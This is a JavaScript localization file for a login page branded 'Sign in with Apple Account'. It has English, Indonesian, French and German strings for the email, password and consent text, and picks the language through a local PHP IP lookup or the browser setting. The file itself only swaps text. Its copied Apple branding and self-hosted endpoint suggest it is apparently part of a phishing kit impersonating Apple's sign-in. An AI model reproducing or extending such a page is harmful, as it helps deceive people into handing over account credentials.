// =========================
// AUTO LANGUAGE (IP + BROWSER)
// =========================

// Translation dictionary
const translations = {
    en: {
        title: "Sign in with Apple Account",
        email: "Email or Phone Number",
        password: "Password",
        create: "Create Your Apple Account",
        continue: "Continue",
        iphone: " Sign in with iPhone",
        require: "Requires a device with iOS 17 or later.",
        desc: `
Your Apple Account information is used to allow you to sign in securely and access your data.
Apple records certain data for security, support, and reporting purposes.
If you agree, Apple may also use your Apple Account information to send you marketing emails
and communications, including based on your use of Apple services.
<a href="#" style="color:#0071e3;text-decoration:none;">
    See how your data is managed…
</a>
        `
    },
    id: {
        title: "Masuk dengan Akun Apple",
        email: "Email atau Nomor Telepon",
        password: "Kata Sandi",
        create: "Buat Akun Apple Anda",
        continue: "Lanjutkan",
        iphone: " Masuk dengan iPhone",
        require: "Memerlukan perangkat dengan iOS 17 atau lebih baru.",
        desc: `
Informasi Akun Apple Anda digunakan untuk memungkinkan Anda masuk dengan aman dan mengakses data Anda.
Apple mencatat data tertentu untuk keperluan keamanan, dukungan, dan pelaporan.
Jika Anda setuju, Apple juga dapat menggunakan informasi Akun Apple Anda untuk mengirim email pemasaran
dan komunikasi lainnya, termasuk berdasarkan penggunaan layanan Apple Anda.
<a href="#" style="color:#0071e3;text-decoration:none;">
    Lihat bagaimana data Anda dikelola…
</a>
        `
    },
    fr: {
        title: "Se connecter avec un identifiant Apple",
        email: "E-mail ou numéro de téléphone",
        password: "Mot de passe",
        create: "Créer votre identifiant Apple",
        continue: "Continuer",
        iphone: " Se connecter avec iPhone",
        require: "Nécessite un appareil sous iOS 17 ou version ultérieure.",
        desc: `
Les informations de votre identifiant Apple sont utilisées pour vous permettre
de vous connecter en toute sécurité et d’accéder à vos données.
Apple enregistre certaines données à des fins de sécurité, d’assistance et de reporting.
Si vous y consentez, Apple peut également utiliser les informations de votre identifiant Apple
pour vous envoyer des communications marketing.
<a href="#" style="color:#0071e3;text-decoration:none;">
    Découvrez comment vos données sont gérées…
</a>
        `
    },
    de: {
        title: "Mit Apple-ID anmelden",
        email: "E-Mail oder Telefonnummer",
        password: "Passwort",
        create: "Apple-ID erstellen",
        continue: "Fortfahren",
        iphone: " Mit iPhone anmelden",
        require: "Erfordert ein Gerät mit iOS 17 oder neuer.",
        desc: `
Die Informationen Ihrer Apple-ID werden verwendet, um Ihnen eine sichere Anmeldung
und den Zugriff auf Ihre Daten zu ermöglichen.
Apple erfasst bestimmte Daten für Sicherheits-, Support- und Berichterstattungszwecke.
Wenn Sie zustimmen, kann Apple Ihre Apple-ID-Informationen auch für Marketing-E-Mails
und andere Mitteilungen verwenden.
<a href="#" style="color:#0071e3;text-decoration:none;">
    Erfahren Sie, wie Ihre Daten verwaltet werden…
</a>
        `
    }
};

// =========================
// APPLY LANGUAGE
// =========================
function applyLanguage(lang) {
    const finalLang = translations[lang] ? lang : "en";

    // TEXT
    document.querySelectorAll("[data-i18n]").forEach(el => {
        const key = el.dataset.i18n;
        if (translations[finalLang][key]) {
            el.textContent = translations[finalLang][key];
        }
    });

    // PLACEHOLDER
    document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
        const key = el.dataset.i18nPlaceholder;
        if (translations[finalLang][key]) {
            el.placeholder = translations[finalLang][key];
        }
    });

    // HTML (DESC)
    document.querySelectorAll("[data-i18n-html]").forEach(el => {
        const key = el.dataset.i18nHtml;
        if (translations[finalLang][key]) {
            el.innerHTML = translations[finalLang][key];
        }
    });
}

// =========================
// DETECT LANGUAGE
// =========================

// 1️⃣ Try IP-based (server)
fetch("detect-lang.php")
    .then(res => res.json())
    .then(data => {
        if (data.lang) {
            applyLanguage(data.lang);
        } else {
            fallbackBrowser();
        }
    })
    .catch(() => {
        fallbackBrowser();
    });

// 2️⃣ Fallback browser language
function fallbackBrowser() {
    const browserLang = navigator.language.toLowerCase().split("-")[0];
    applyLanguage(browserLang);
}
